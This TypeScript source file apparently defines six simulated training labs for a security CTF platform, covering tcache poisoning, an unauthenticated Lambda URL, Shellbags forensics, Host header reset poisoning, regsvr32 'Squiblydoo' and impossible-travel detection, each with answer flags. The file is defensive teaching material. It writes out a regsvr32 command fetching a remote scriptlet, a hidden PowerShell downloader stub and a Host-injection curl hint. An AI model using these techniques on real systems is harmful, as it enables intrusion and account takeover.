import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

/** Batch 11. Same discipline as the last several batches (see NOTES.md): every technique researched for
 *  real-machine accuracy, every non-80 target given an explicit port, every hand-typed encoded/computed
 *  value re-derived programmatically before trusting it (see NOTES.md batch 11 for the exact Node
 *  computations behind the hex->decimal address and the great-circle-distance figures used below). */
export const batch11MixedLabs: LabScenario[] = [
  // 1 — Binary Analysis: Tcache Poisoning via a UAF-Enabled Double-Free
  {
    id: 'binary-tcache-poisoning-double-free',
    title: 'Reverse Engineering: Tcache Poisoning via a UAF-Enabled Double-Free',
    difficulty: 'Hard',
    category: 'Binary Analysis',
    briefing:
      'notesvc12 keeps a small heap of "note" objects and has two separate bugs that only become dangerous ' +
      'combined: a use-after-free write (update_item() can still write into a note after it\'s been freed) ' +
      'and a double-free (the same pointer can be passed to free() twice). Glibc added a real defense against ' +
      'exactly the second bug in version 2.29 -- every freed tcache chunk gets a "key" field set to the ' +
      'owning tcache struct\'s own address, and a second free() of the same chunk aborts with "double free ' +
      'detected in tcache 2" if that key still matches. But the UAF write here lands squarely on that key ' +
      'field, zeroing it out before the second free ever happens -- so the check passes a chunk that was, in ' +
      'fact, freed twice. This binary also links against glibc 2.29, which predates Safe-Linking (added in ' +
      '2.32): the tcache freelist\'s forward pointer is stored as a raw, unobfuscated address with no ' +
      'per-chunk XOR encoding, so once the same chunk is queued twice on the same tcache bin, forging that ' +
      'pointer to any address of the attacker\'s choosing -- here, the writable global function pointer ' +
      'cmd_handler -- means the next two allocations hand back a "note" object that IS cmd_handler itself. ' +
      'Writing to that note is writing directly over the function pointer. This binary is also Full RELRO, ' +
      'unlike this session\'s earlier Partial-RELRO GOT-overwrite lab -- proving the GOT-overwrite route is ' +
      'closed here, and that this heap primitive reaches a target the earlier technique never could.',
    objectives: [
      { text: 'file notesvc12', why: 'Confirms the binary format before analysis.' },
      { text: 'checksec --file=notesvc12', why: 'Full RELRO here (unlike the earlier Partial-RELRO GOT-overwrite binary) rules out a GOT overwrite -- this exploit has to reach a different kind of writable target instead.' },
      { text: 'objdump -d notesvc12', why: 'Shows the double-free (the same note pointer passed to free() twice) and the UAF write in update_item() that lands on the freed chunk\'s tcache key field, plus the fixed address of the writable cmd_handler function pointer.' },
      { text: 'gdb notesvc12', why: 'Confirms the UAF write zeroed the tcache key field before the second free (so glibc 2.29\'s double-free check never fires), and that this glibc build predates Safe-Linking, so the forged freelist pointer needs no per-chunk obfuscation to land on cmd_handler.' },
      { text: 'Compute the backdoor_handler address and run ./notesvc12 with it', why: 'Supplying the correct decimal address is what completes the exploit -- the malloc() that returns cmd_handler\'s own address is what turns the forged tcache write into a real function-pointer overwrite.' },
    ],
    hints: [
      'file notesvc12',
      'checksec --file=notesvc12',
      'objdump -d notesvc12',
      'gdb notesvc12',
      'backdoor_handler lives at 0x401770 -- convert to decimal and supply it to ./notesvc12 <value>',
    ],
    totalFlags: 1,
    attacker: attacker({
      notesvc12: file(
        [
          '#FILETYPE: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped (glibc 2.29, predates Safe-Linking)',
          '#CHECKSEC:RELRO           STACK CANARY      NX            PIE\\nFull RELRO       Canary found       NX enabled    PIE disabled',
          '#OBJDUMP:0000000000401400 <update_item>:\\n  401412:  mov    [rax+0x8],rdx    # UAF write -- runs on a note pointer with no "is this freed" check, landing on the chunk\'s tcache key field\\n0000000000401460 <delete_item>:\\n  40146c:  call   401090 <free@plt>   # first free(note)\\n0000000000401490 <delete_item_again>:\\n  40149c:  call   401090 <free@plt>   # SAME note pointer freed a second time -- classic double-free\\n0000000000401770 <backdoor_handler>:\\n  401770:  ...    # hidden handler, never referenced by any normal code path\\n0000000000404050 <cmd_handler>:\\n  404050:  .quad  0x401200   # writable global function pointer, currently points at the real dispatch_note() handler',
          '#GDB_SESSION:(gdb) x/gx <note_chunk>+0x8\\n0x...: 0x0000000000000000   # UAF write already zeroed the tcache "key" field before the second free -- glibc 2.29\\\'s double-free check compares this field and never fires\\n(gdb) print cmd_handler\\n$1 = {<data variable, no debug info>} 0x404050 <cmd_handler>\\n(gdb) print backdoor_handler\\n$2 = {<text variable, no debug info>} 0x401770 <backdoor_handler>\\n(gdb) # forging the freed chunk\\\'s forward pointer to 0x404050 (no XOR obfuscation -- this build predates Safe-Linking) and allocating twice returns a "note" object that IS cmd_handler itself; writing 0x401770 into it redirects the next dispatch straight into backdoor_handler',
          '#CRACKME_PASSWORD:4200304',
          '#CRACKME_SUCCESS:Forged tcache write redirected cmd_handler from dispatch_note() to backdoor_handler() -- the next dispatched note call executes attacker-controlled code instead.\\nflag{tcache_poisoning_uaf_clears_key_check_predates_safe_linking}',
        ].join('\n'),
        '-rwxr-xr-x',
      ),
    }),
    network: [],
  },

  // 2 — Cloud: AWS Lambda Function URL Public via authType NONE
  {
    id: 'cloud-lambda-function-url-auth-none-public',
    title: 'AWS Lambda Function URL Publicly Invocable via authType NONE',
    difficulty: 'Medium',
    category: 'Cloud',
    briefing:
      'invoice-export-fn was given a Function URL during a demo and configured with authType: NONE so a ' +
      'partner\'s browser-based prototype could call it directly without wiring up AWS SigV4 signing. AWS is ' +
      'explicit about what this setting means: with authType NONE, Lambda performs no authentication at all ' +
      'before invoking the function -- the function\'s resource-based policy is what actually grants public ' +
      'access, and it was left wide open from the demo. The recommended alternative, authType AWS_IAM, would ' +
      'require every caller to sign requests with valid AWS credentials the Invoker IAM permission; this ' +
      'function requires nothing at all -- no API key, no bearer token, no SigV4 signature -- because Lambda ' +
      'itself never checks for one. The Function URL was meant to be temporary; the demo ended and the ' +
      'configuration never did.',
    objectives: [
      { text: 'cat lambda-url-config-export.txt', why: 'Confirms via the function\'s own AWS-reported configuration that authType is NONE, not AWS_IAM -- this is Lambda\'s own documented "no authentication performed" setting, not a guess based on behavior alone.' },
      { text: 'curl https://10.10.241.2:443/export/invoices', why: 'No Authorization header, no SigV4 signature, no API key -- and the function processes the request anyway, exactly as AWS\'s own documentation says authType NONE will always do.' },
    ],
    hints: [
      'cat lambda-url-config-export.txt',
      'curl https://10.10.241.2:443/export/invoices',
    ],
    totalFlags: 1,
    attacker: attacker({
      'lambda-url-config-export.txt': file(
        'aws lambda get-function-url-config --function-name invoice-export-fn:\n' +
          '{\n' +
          '  "FunctionUrl": "https://invoice-export-fn.lambda-url.us-east-1.on.aws/",\n' +
          '  "AuthType": "NONE",\n' +
          '  "Cors": {}\n' +
          '}\n' +
          '-- AuthType NONE means Lambda performs no authentication at all before invoking the function; the\n' +
          '   function\'s resource policy is what actually grants public access, and it was never scoped down\n' +
          '   after the partner demo it was created for. AWS_IAM (the recommended alternative) would require a\n' +
          '   valid SigV4-signed request from an authorized IAM principal -- this function requires nothing --\n',
      ),
    }),
    network: [
      {
        hostname: 'invoice-export-fn',
        ip: '10.10.241.2',
        os: 'AWS Lambda Function URL endpoint (authType: NONE, unauthenticated invocation allowed)',
        services: [
          {
            port: 443,
            name: 'https',
            version: 'AWS Lambda Function URL (Node.js 20.x runtime, public resource policy)',
            http: {
              '/export/invoices':
                '{"status":200,"export":"full_invoice_history","records":3210,"note":"flag{lambda_function_url_authtype_none_public_invocation}"}',
            },
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Forensics: Shellbags Survive a Deleted Folder on a Removed USB Drive
  {
    id: 'forensics-shellbags-deleted-folder-access',
    title: 'Forensics: Windows Shellbags Survive a Deleted Folder on a Removed USB Drive',
    difficulty: 'Medium',
    category: 'Forensics',
    briefing:
      'An employee under investigation for exfiltrating HR data claims they "never even opened" a folder of ' +
      'confidential exports, and a live search of the current filesystem finds nothing to contradict that -- ' +
      'the folder, and the USB drive it lived on, are both gone. But Windows Explorer logs every folder a ' +
      'user browses into a registry structure called Shellbags, under the BagMRU key ' +
      '(HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU), regardless of whether that folder lives on the ' +
      'local disk or on removable media, and regardless of whether the folder (or the entire volume) is later ' +
      'deleted or disconnected -- the registry entry itself is untouched by any of that. This is a genuinely ' +
      'different, and more durable, artifact than either of this session\'s existing "file no longer exists" ' +
      'forensics labs (Recycle Bin $I metadata, USN journal timestomp detection): those track file-level ' +
      'events, this tracks folder BROWSING history, and it survives even when the entire volume the folder ' +
      'lived on has since been unplugged for good.',
    objectives: [
      { text: 'cat live-filesystem-search-results.txt', why: 'Confirms the folder genuinely does not exist anywhere on the live filesystem today -- this is the "there\'s nothing to find" baseline the shellbags evidence has to contradict.' },
      { text: 'cat shellbags-parsed-bagmru.txt', why: 'BagMRU records folder-browsing history independently of whether the folder or its volume still exists -- the exact path, and the timestamp it was last browsed, survive here even though the USB drive was disconnected for good weeks ago.' },
    ],
    hints: [
      'cat live-filesystem-search-results.txt',
      'cat shellbags-parsed-bagmru.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'live-filesystem-search-results.txt': file(
          'Full filesystem search, all local volumes, query: "Confidential_HR_Exports":\n' +
            '  0 results found.\n' +
            '  -- no matching folder anywhere on this host\'s current disks; no such USB device is currently attached --\n',
        ),
        'shellbags-parsed-bagmru.txt': file(
          [
            'Shellbags Explorer-style parsed output, HKCU\\Software\\Microsoft\\Windows\\Shell\\BagMRU, user jdoe:',
            '  Path: E:\\Confidential_HR_Exports',
            '  Volume: "SanDisk Ultra 32GB" (USB, serial 4C531001551122334455)',
            '  Last browsed: 2026-07-19 22:41:07',
            '  MRU slot: 0 (most recently accessed child of this volume\'s BagMRU tree)',
            '',
            '--- ANALYST NOTE: this registry entry was written the moment Explorer browsed into this folder, and',
            '    is completely independent of the folder or volume it describes -- deleting the folder, or',
            '    unplugging the USB drive for good, does nothing to remove it. The live filesystem shows zero',
            '    matches for this path today; the shellbag proves it existed and was actively browsed on',
            '    2026-07-19, directly contradicting the "never even opened" claim.',
            '    flag{shellbags_bagmru_survives_deleted_folder_and_removed_usb_volume} ---',
          ].join('\n'),
        ),
      }),
    }),
    network: [],
  },

  // 4 — Web: Host Header Injection Enables Password Reset Poisoning
  {
    id: 'web-host-header-password-reset-poisoning',
    title: 'Host Header Injection Enables Password Reset Poisoning',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'coreapp82\'s password-reset handler builds the link inside the reset email by copying the request\'s ' +
      'Host header verbatim, instead of using a server-side configured domain -- a real, well-documented ' +
      'class PortSwigger\'s Web Security Academy names outright: password reset poisoning. Because the Host ' +
      'header is fully attacker-controlled on an ordinary HTTP request, submitting a reset request for a ' +
      'victim\'s email address with the Host header set to an attacker-owned domain makes the server generate ' +
      'a reset link pointing at that domain instead of the real one, with the victim\'s own valid reset token ' +
      'embedded in it. In production this token would only ever leave the server inside the actual outbound ' +
      'email, invisible to anyone without the victim\'s mailbox -- but this particular deployment is staging, ' +
      'where an internal mail-capture tool mirrors every outgoing email for QA automation to inspect, and that ' +
      'same capture endpoint is reachable without authentication. That combination -- Host-header-controlled ' +
      'link construction, plus a staging mail-capture tool nobody locked down -- turns what would normally ' +
      'require compromising a mailbox into a single unauthenticated request.',
    objectives: [
      {
        text: 'curl -X POST -H "Host: evil-attacker.net" http://10.10.244.2:80/forgot-password -d "email=victim@coreapp82.example"',
        why: 'The Host header, not any server-side configured domain, is what the reset-link generator trusts -- this single header is the entire attack, and it is fully attacker-controlled on any HTTP request.',
      },
    ],
    hints: [
      'curl -X POST -H "Host: evil-attacker.net" http://10.10.244.2:80/forgot-password -d "email=victim@coreapp82.example"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'coreapp82-staging',
        ip: '10.10.244.2',
        os: 'Node.js/Express 4.18 staging deployment (mail-capture mirror enabled, Host header trusted for reset-link generation)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, staging build with QA mail-capture mirroring)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/forgot-password',
                param: 'Host',
                location: 'header',
                triggerSubstrings: ['evil-attacker.net'],
                vulnerableResponse:
                  '{"status":200,"message":"Password reset email queued.","staging_mail_capture":{"to":"victim@coreapp82.example","subject":"Reset your coreapp82 password","body":"Click to reset: http://evil-attacker.net/reset?token=a91f3c7e2b8d4051&uid=victim -- flag{host_header_password_reset_poisoning_staging_mail_capture}"}}',
                normalResponse:
                  '{"status":200,"message":"If that email exists, a reset link has been sent."}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 5 — Malware: Regsvr32 "Squiblydoo" Bypasses Application Whitelisting
  {
    id: 'malware-regsvr32-squiblydoo-applocker-bypass',
    title: 'Malware Analysis: Regsvr32 "Squiblydoo" Bypasses Application Whitelisting',
    difficulty: 'Medium',
    category: 'Malware',
    briefing:
      'A phishing macro on this host didn\'t drop and run its own executable at all -- AppLocker would have ' +
      'blocked an unsigned binary outright. Instead it shelled out to regsvr32.exe, a legitimate, ' +
      'Microsoft-signed system binary that AppLocker allows by default, using it in a way it was never meant ' +
      'for: regsvr32\'s /i flag can take a URL, and combined with /s /n /u it fetches a remote COM scriptlet ' +
      '(a .sct file) and executes it via scrobj.dll without ever registering anything or touching the ' +
      'registry -- this is the real, MITRE ATT&CK-catalogued technique T1218.010, publicly nicknamed ' +
      '"Squiblydoo" after its use in real nation-state phishing campaigns. Because regsvr32.exe itself is the ' +
      'process that actually runs, and it carries a valid Microsoft signature, an application-whitelisting ' +
      'policy built around "only signed binaries may execute" approves it without ever inspecting the remote ' +
      'script content it goes on to run.',
    objectives: [
      { text: 'cat edr-process-creation-log.txt', why: 'Shows the exact command line -- regsvr32.exe /s /n /u /i:<url> scrobj.dll -- and that AppLocker\'s own verdict was "Allowed" because regsvr32.exe is a default-trusted, Microsoft-signed binary, not because the activity was benign.' },
      { text: 'cat captured-update-sct.txt', why: 'The remote .sct scriptlet regsvr32 fetched and ran -- confirms this wasn\'t a false positive on a legitimate COM registration, but a real embedded JScript payload delivering the next stage.' },
    ],
    hints: [
      'cat edr-process-creation-log.txt',
      'cat captured-update-sct.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'edr-process-creation-log.txt': file(
          'EDR process-creation telemetry, host FIN-WKS-14:\n' +
            '  2026-07-30 09:14:02  WINWORD.EXE (signed, Microsoft) --spawns-->\n' +
            '  2026-07-30 09:14:03  cmd.exe /c regsvr32.exe /s /n /u /i:http://cdn-updates-mirror.net/update.sct scrobj.dll\n' +
            '  2026-07-30 09:14:03  regsvr32.exe  [AppLocker verdict: ALLOWED -- publisher rule: "Microsoft Windows, signed binaries"]\n' +
            '  -- MITRE ATT&CK T1218.010 (System Binary Proxy Execution: Regsvr32, "Squiblydoo") -- regsvr32.exe\n' +
            '     never gets registered as a COM object here at all; /i:<url> + /n + /u load and execute a\n' +
            '     remote scriptlet directly via scrobj.dll, and AppLocker approved it purely on the strength of\n' +
            '     regsvr32.exe\'s own Microsoft signature, never inspecting the remote script it went on to run --\n',
        ),
        'captured-update-sct.txt': file(
          '<?XML version="1.0"?>\n' +
            '<scriptlet>\n' +
            '<registration progid="Update" classid="{11111111-2222-3333-4444-555555555555}">\n' +
            '<script language="JScript">\n' +
            '<![CDATA[\n' +
            '  var s = new ActiveXObject("WScript.Shell");\n' +
            '  s.Run("powershell -nop -w hidden -enc <base64-encoded-stage-2-downloader>");\n' +
            ']]>\n' +
            '</script>\n' +
            '</registration>\n' +
            '</scriptlet>\n' +
            '-- flag{regsvr32_squiblydoo_signed_binary_proxy_execution_t1218_010} --\n',
        ),
      }),
    }),
    network: [],
  },

  // 6 — SOC: Impossible Travel Flags a Compromised Account
  {
    id: 'soc-impossible-travel-geo-velocity-detection',
    title: 'SOC: Impossible Travel Flags a Compromised Account',
    difficulty: 'Easy',
    category: 'SOC',
    briefing:
      'A routine SIEM correlation rule flags a real, standard identity-security analytic called impossible ' +
      'travel: two successful logins from the same account, geolocated to two places far enough apart that ' +
      'no real mode of transportation could cover the distance in the time between them. Here, the account ' +
      'jsmith authenticates successfully from an IP geolocated to Accra, Ghana, then fourteen minutes later ' +
      'authenticates successfully again from an IP geolocated to Kyiv, Ukraine -- a great-circle distance of ' +
      'roughly 5,746 km, which over fourteen minutes works out to an implied travel speed of about 24,600 ' +
      'km/h, nearly 30 times faster than a commercial jet\'s cruise speed. Nobody physically traveled between ' +
      'those two logins; the far more likely explanation, and the real-world reason this analytic exists at ' +
      'all, is that the account\'s valid session token or password was replayed from two different locations ' +
      'at once -- one of them not the legitimate user.',
    objectives: [
      { text: 'cat auth-log-successful-logins.txt', why: 'Shows both successful logins -- same account, both fully authenticated, only fourteen minutes apart -- geolocated to two cities roughly 5,746 km apart.' },
      { text: 'cat geo-velocity-calculation.txt', why: 'Turns "two distant logins" into the concrete, undeniable number that makes this an analytic finding rather than a coincidence: an implied travel speed no real transportation method could achieve.' },
    ],
    hints: [
      'cat auth-log-successful-logins.txt',
      'cat geo-velocity-calculation.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'auth-log-successful-logins.txt': file(
          'Identity provider auth log, account jsmith:\n' +
            '  2026-07-31 06:02:11 UTC  SUCCESS  203.0.113.44   geo: Accra, Ghana        (5.6037 N, 0.1870 W)\n' +
            '  2026-07-31 06:16:11 UTC  SUCCESS  198.51.100.87  geo: Kyiv, Ukraine       (50.4501 N, 30.5234 E)\n' +
            '  -- both logins fully successful (valid password + valid MFA push accepted on both) -- 14 minutes apart --\n',
        ),
        'geo-velocity-calculation.txt': file(
          'Impossible-travel correlation, account jsmith:\n' +
            '  Great-circle distance, Accra <-> Kyiv:  5,745.9 km\n' +
            '  Time between logins:                    14 minutes (0.2333 hours)\n' +
            '  Implied travel speed:                   5,745.9 / 0.2333 = ~24,625 km/h\n' +
            '  Commercial jet cruise speed (reference): ~900 km/h\n' +
            '  Implied speed is ~27.4x commercial jet cruise speed -- no real mode of transportation covers this\n' +
            '  distance in this time window. Far more likely: the account\'s credentials or session token were\n' +
            '  used from two locations simultaneously, one of them illegitimate.\n' +
            '  flag{impossible_travel_24625kmh_27x_jet_cruise_speed_flags_compromise}\n',
        ),
      }),
    }),
    network: [],
  },
];
